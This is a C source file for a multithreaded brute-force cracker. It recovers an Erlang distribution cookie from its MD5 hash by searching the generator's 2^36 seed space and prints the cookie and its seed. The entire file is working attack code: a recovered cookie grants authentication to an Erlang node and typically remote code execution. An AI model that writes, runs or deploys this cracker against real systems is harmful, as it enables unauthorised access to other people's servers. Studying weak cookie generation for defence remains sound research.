#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <inttypes.h>
#include <assert.h>

#include "erldp.h"

#include <nettle/md5.h>
#include <nettle/base64.h>

volatile int quit = 0;
/* raw md5 of cookie, to be uncovered */
uint8_t raw_hash[MD5_DIGEST_SIZE];

char found_cookie[20];
uint64_t found_seed;

struct worker {
  pthread_t tid;
  uint64_t start;
  uint64_t end;
  uint64_t incr;
};

static void *run(void *arg) {
  struct worker *w = arg;
  uint64_t seed;
  char cookie[20];
  struct md5_ctx hash_ctx;
  uint8_t digest[MD5_DIGEST_SIZE];

  for (seed = w->start; seed <= w->end && !quit; seed += w->incr) {
    create_cookie(seed, cookie, sizeof(cookie));

    md5_init(&hash_ctx);
    md5_update(&hash_ctx, sizeof(cookie), (uint8_t *) cookie);
    md5_digest(&hash_ctx, MD5_DIGEST_SIZE, digest);

    if (raw_hash[0] == digest[0] && memcmp(raw_hash, digest, MD5_DIGEST_SIZE) == 0) {
      memcpy(found_cookie, cookie, sizeof(cookie));
      found_seed = seed;

      quit = 1;
      return NULL;
    }
  }

  return NULL;
}


int main(int argc, char **argv) {
  int n_workers = 8;
  struct worker *workers;
  int i;
  int ret;
  struct base64_decode_ctx base64_ctx;
  size_t dst_size = sizeof(raw_hash);
  const char *hash;

  if (argc != 2) {
    fprintf(stderr, "usage: %s <base64-encoded md5 of cookie>\n", argv[0]);
    exit(1);
  }

  hash = argv[1];

  base64_decode_init(&base64_ctx);
  base64_decode_update(&base64_ctx, &dst_size, raw_hash, strlen(hash), (const uint8_t *) hash);
  ret = base64_decode_final(&base64_ctx);
  assert(ret == 1);
  assert(dst_size == MD5_DIGEST_SIZE);

  workers = calloc(sizeof(*workers), n_workers);
  assert(workers);

  for (i = 0; i < n_workers; i++) {
    workers[i].start = 0 + i;
    workers[i].end = (1ULL<<36)-1;
    workers[i].incr = n_workers;

    ret = pthread_create(&workers[i].tid, NULL, run, &workers[i]);
    assert(ret == 0);
  }

  for (i = 0; i < n_workers; i++) {
    pthread_join(workers[i].tid, NULL);
  }

  if (quit) {
    printf("%.*s\n", 20, found_cookie);
    fprintf(stderr, "  seed used to generate it = %" PRIu64 "\n", found_seed);
  }
  else {
    fprintf(stderr, "cookie hash did not reveal a generated cookie\n");
  }

  return 0;
}

